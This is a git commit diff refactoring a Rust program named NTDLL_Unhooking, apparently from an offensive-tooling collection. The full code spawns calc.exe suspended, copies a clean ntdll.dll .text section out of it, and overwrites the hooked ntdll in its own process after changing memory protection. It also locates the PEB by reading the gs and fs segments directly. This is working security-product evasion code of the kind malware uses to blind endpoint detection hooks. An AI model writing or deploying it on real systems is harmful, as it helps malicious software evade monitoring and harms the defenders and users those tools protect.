d6e2724d0cfa5dd31e33467e869a36faf06a3255
joaoviictorti <joaovictorti08@gmail.com>
2025-04-28 22:09:21 -0300

    refactor: code cleanup & minor fixes

--- NTDLL_Unhooking/src/main.rs
+++ NTDLL_Unhooking/src/main.rs
@@ -1,141 +1,206 @@
 use ntapi::{
     ntldr::LDR_DATA_TABLE_ENTRY,
-    ntpebteb::{PEB, TEB},
-    winapi::ctypes::c_void,
+    ntpebteb::PEB,
 };
-use std::{ffi::CString, panic, ptr::null_mut};
+use std::{
+    ffi::c_void, 
+    ptr::null_mut
+};
 use windows::{
-    core::PSTR,
+    core::{PSTR, Result},
     Win32::System::{
-        Diagnostics::Debug::{ReadProcessMemory, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER},
-        Kernel::NT_TIB,
-        Memory::{GetProcessHeap, HeapAlloc, VirtualProtect, HEAP_ZERO_MEMORY, PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS},
-        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
-        Threading::{CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA},
+        Memory::*,
+        Diagnostics::Debug::{
+            ReadProcessMemory, 
+            IMAGE_NT_HEADERS64, 
+            IMAGE_SECTION_HEADER
+        }
     },
 };
 
-fn main() {
-    unsafe { ntdll_unhooking() };
-}
+use windows::Win32::System::{
+    SystemServices::{
+        IMAGE_DOS_HEADER, 
+        IMAGE_DOS_SIGNATURE, 
+        IMAGE_NT_SIGNATURE
+    },
+    Threading::{
+        CreateProcessA, CREATE_SUSPENDED, 
+        PROCESS_INFORMATION, STARTUPINFOA
+    },
+};
 
-unsafe fn ntdll_unhooking() {
-    let process = CString::new("C:\\Windows\\System32\\calc.exe").unwrap().into_raw() as _;
-    let address_ntdll = ntdll_local_address("ntdll.dll".to_string()).expect("[!] Error retrieving ntdll");
+fn main() -> Result<()> {
+    unsafe  {
+        // Path to the target process to be created in suspended mode
+        let process = c"C:\\Windows\\System32\\calc.exe";
+
+        // Retrieve base address of ntdll.dll from current process
+        let module = get_ntdll_address();
+        
+        // Create a new suspended process (calc.exe)
+        let si = STARTUPINFOA { cb: size_of::<STARTUPINFOA>() as u32, ..Default::default() };
+        let mut pi = PROCESS_INFORMATION::default();
+        CreateProcessA(
+            None,
+            PSTR(process.as_ptr() as *mut u8),
+            None,
+            None,
+            false,
+            CREATE_SUSPENDED,
+            None,
+            None,
+            &si,
+            &mut pi,
+        )?;
+        
+        // Validate DOS header of ntdll
+        let dos_header = module as *mut IMAGE_DOS_HEADER;
+        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
+            eprintln!("[!] INVALID DOS SIGNATURE");
+            return Ok(())
+        }
     
-    let startup_info = STARTUPINFOA { cb: std::mem::size_of::<STARTUPINFOA>() as u32, ..Default::default() };
-    let mut process_information = PROCESS_INFORMATION::default();
-    CreateProcessA(
-        None,
-        PSTR(process),
-        None,
-        None,
-        false,
-        CREATE_SUSPENDED,
-        None,
-        None,
-        &startup_info,
-        &mut process_information,
-    ).unwrap_or_else(|e| panic!("[!] CreateProcessA Failed With Error: {e}"));
-
-    let dos_header = address_ntdll as *mut IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
-        panic!("[!] INVALID DOS SIGNATURE");
-    }
-
-    let nt_header = ((*dos_header).e_lfanew as usize + address_ntdll as usize) as *mut IMAGE_NT_HEADERS64;
-    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
-        panic!("[!] INVALID NT SIGNATURE");
-    }
-
-    let size_ntdll = (*nt_header).OptionalHeader.SizeOfImage;
-    let buffer_ntdll = HeapAlloc(GetProcessHeap().unwrap(),HEAP_ZERO_MEMORY,size_ntdll as usize);
-    let mut return_len = 0;
-    ReadProcessMemory(
-        process_information.hProcess,
-        address_ntdll as _,
-        buffer_ntdll,
-        size_ntdll as usize,
-        Some(&mut return_len),
-    ).unwrap_or_else(|e| panic!("[!] ReadProcessMemory Failed With Error: {e}"));
-
-    let section_header =  (nt_header as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
-    let mut tmp_nt_local = null_mut();
-    let mut tmp_nt_process = null_mut();
-    let mut ntdll_txt_size: usize = 0;
-
-    for i in 0..(*nt_header).FileHeader.NumberOfSections {
-        let section = (*section_header.add(i.into())).Name;
-        let name = std::str::from_utf8(&section).unwrap().trim_matches('\0');
-        if name == ".text" {
-            tmp_nt_local = (address_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut std::ffi::c_void;
-            tmp_nt_process =  (buffer_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut std::ffi::c_void;
-            ntdll_txt_size = (*section_header.add(i.into())).Misc.VirtualSize as usize;
+        // Validate NT header of ntdll
+        let nt_header = ((*dos_header).e_lfanew as usize + module as usize) as *mut IMAGE_NT_HEADERS64;
+        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
+            eprintln!("[!] INVALID NT SIGNATURE");
+            return Ok(())
         }
+    
+        // Allocate buffer to hold a clean copy of ntdll.dll from the suspended process
+        let size_image = (*nt_header).OptionalHeader.SizeOfImage;
+        let buffer_ntdll = HeapAlloc(GetProcessHeap()?, HEAP_ZERO_MEMORY, size_image as usize);
+        let mut number_bytes = 0;
+        ReadProcessMemory(
+            pi.hProcess,
+            module.cast(),
+            buffer_ntdll,
+            size_image as usize,
+            Some(&mut number_bytes),
+        )?;
+    
+        // Locate the .text section (code section) of ntdll
+        let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;
+        let mut tmp_nt_local = null_mut();
+        let mut tmp_nt_process = null_mut();
+        let mut ntdll_txt_size = 0;
+        for i in 0..(*nt_header).FileHeader.NumberOfSections {
+            let section = (*section_header.add(i.into())).Name;
+            let name = std::str::from_utf8(&section)
+                .unwrap_or("")
+                .trim_matches('\0');
+            
+            if name == ".text" {
+                tmp_nt_local = (module as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut c_void;
+                tmp_nt_process = (buffer_ntdll as usize + (*section_header.add(i.into())).VirtualAddress as usize) as *mut c_void;
+                ntdll_txt_size = (*section_header.add(i.into())).Misc.VirtualSize as usize;
+            }
+        }
+    
+        println!("NTDLL HOOKED ADDRESS: {:?}", tmp_nt_local);
+        println!("NTDLL UNHOOKED ADDRESS: {:?}", tmp_nt_process);
+    
+        // Change protection to allow overwriting the hooked .text section
+        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+        VirtualProtect(
+            tmp_nt_local, 
+            ntdll_txt_size, 
+            PAGE_EXECUTE_WRITECOPY,
+            &mut old_protect
+        )?;
+    
+        // Overwrite the hooked .text section with the clean one
+        std::ptr::copy_nonoverlapping(tmp_nt_process, tmp_nt_local, ntdll_txt_size);
+    
+        // Restore original protection
+        VirtualProtect(
+            tmp_nt_local, 
+            ntdll_txt_size, 
+            old_protect, 
+            &mut old_protect
+        )?;
     }
 
-    println!("NTDLL HOOKED ADDRESS: {:?}", tmp_nt_local);
-    println!("NTDLL UNHOOKED ADDRESS: {:?}", tmp_nt_process);
-
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    VirtualProtect(
-        tmp_nt_local, 
-        ntdll_txt_size, 
-        PAGE_EXECUTE_WRITECOPY,
-        &mut old_protect
-    ).unwrap_or_else(|e| panic!("[!] VirtualProtect Failed With Error: {e}"));
-
-    std::ptr::copy_nonoverlapping(tmp_nt_process, tmp_nt_local, ntdll_txt_size);
-
-    VirtualProtect(
-        tmp_nt_local, 
-        ntdll_txt_size, 
-        old_protect, 
-        &mut old_protect
-    ).unwrap_or_else(|e| panic!("[!] VirtualProtect (2) Failed With Error: {e}"));
-
-    println!("[+] FINISH :)")
+    Ok(())
 }
 
-unsafe fn ntdll_local_address(dll: String) -> Result<*mut c_void, ()> {
-    let peb = get_peb();
-    let ldr = (*peb).Ldr;
-    let mut list_entry = (*ldr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;
-
-    while !(*list_entry).DllBase.is_null() {
-        let buffer = std::slice::from_raw_parts(
-            (*list_entry).BaseDllName.Buffer,
-            ((*list_entry).BaseDllName.Length / 2) as usize,
-        );
-        let dll_name = String::from_utf16(buffer)
-            .unwrap()
-            .to_string()
-            .to_lowercase();
-
-        if dll.to_lowercase() == dll_name {
-            return Ok((*list_entry).DllBase);
-        }
-
-        list_entry = (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
+/// Retrieves the base address of the `ntdll.dll` module.
+///
+/// This function accesses the Process Environment Block (PEB) and traverses
+/// the loader data structures to locate the base address of `ntdll.dll`.
+/// 
+/// # Returns
+///
+/// * A pointer to the base address of the `ntdll.dll` module.
+fn get_ntdll_address() -> *mut c_void {
+    unsafe {
+        let peb = NtCurrentPeb();
+        let ldr_data = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
+            .offset(if cfg!(target_arch = "x86_64") { -0x10 } else { -0x08 }) 
+            as *const LDR_DATA_TABLE_ENTRY;
+        
+        (*ldr_data).DllBase.cast::<c_void>()
     }
-
-    Err(())
 }
 
-unsafe fn get_peb() -> *mut PEB {
-    let teb_offset = ntapi::FIELD_OFFSET!(NT_TIB, Self_) as u32;
+/// Retrieves a pointer to the Process Environment Block (PEB) of the current process.
+/// 
+/// # Returns
+/// 
+/// * Pointer to the PEB structure.
+#[inline(always)]
+#[allow(non_snake_case)]
+fn NtCurrentPeb() -> *const PEB {
+    unsafe {
+        #[cfg(target_arch = "x86_64")]
+        return __readgsqword(0x60) as *const PEB;
 
-    #[cfg(target_arch = "x86_64")]
-    {
-        use ntapi::winapi_local::um::winnt::__readgsqword;
-        let teb = __readgsqword(teb_offset) as *mut TEB;
-        (*teb).ProcessEnvironmentBlock
+        #[cfg(target_arch = "x86")]
+        return __readfsdword(0x30) as *const PEB;
     }
+}
 
-    #[cfg(target_arch = "x86")]
-    {
-        use ntapi::winapi_local::um::winnt::__readfsdword;
-        let teb = __readfsdword(teb_offset) as *mut TEB;
-        (*teb).ProcessEnvironmentBlock
-    }
+/// Reads a `u64` value from the GS segment at the specified offset.
+/// 
+/// # Arguments
+/// 
+/// * `offset` - The offset from the GS base where the value is located.
+/// 
+/// # Returns
+/// 
+/// * The value read from the GS segment.
+#[inline(always)]
+#[cfg(target_arch = "x86_64")]
+unsafe fn __readgsqword(offset: u64) -> u64 {
+    let out: u64;
+    core::arch::asm!(
+        "mov {}, gs:[{:e}]",
+        lateout(reg) out,
+        in(reg) offset,
+        options(nostack, pure, readonly),
+    );
+    out
+}
+
+/// Reads a `u32` value from the FS segment at the specified offset.
+/// 
+/// # Arguments
+/// 
+/// * `offset` - The offset from the FS base where the value is located.
+/// 
+/// # Returns
+/// 
+/// * The value read from the FS segment.
+#[inline(always)]
+#[cfg(target_arch = "x86")]
+unsafe fn __readfsdword(offset: u32) -> u32 {
+    let out: u32;
+    core::arch::asm!(
+        "mov {:e}, fs:[{:e}]",
+        lateout(reg) out,
+        in(reg) offset,
+        options(nostack, pure, readonly),
+    );
+    out
 }
